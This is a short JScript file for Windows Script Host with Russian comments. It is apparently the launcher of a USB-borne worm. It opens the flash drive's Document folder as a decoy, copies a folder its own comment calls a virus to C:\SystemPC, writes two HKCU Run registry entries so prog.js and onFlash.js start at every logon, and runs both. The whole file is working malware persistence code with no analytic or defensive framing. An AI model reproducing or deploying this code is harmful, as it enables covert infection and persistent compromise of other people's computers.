var FSO = WScript.CreateObject("Scripting.FIleSystemObject");
var WshShell = WScript.CreateObject("Wscript.Shell");
var pt1 = FSO.GetDriveName(WshShell.CurrentDirectory);//имя флешки
//открываем окно с докумнтами и копирум вирус на с:\
WshShell.Run(pt1+"\\Document");
FSO.CopyFolder(pt1+"\\Document\\SystemPC","C:\\");
//запись в реестр
WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\prog","C:\\SystemPC\\prog.js","REG_SZ");
WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\onFlash","C:\\SystemPC\\onFlash.js","REG_SZ");
//запуск программ
WshShell.Run("C:\\SystemPC\\onFlash.js");
WshShell.Run("C:\\SystemPC\\prog.js");











































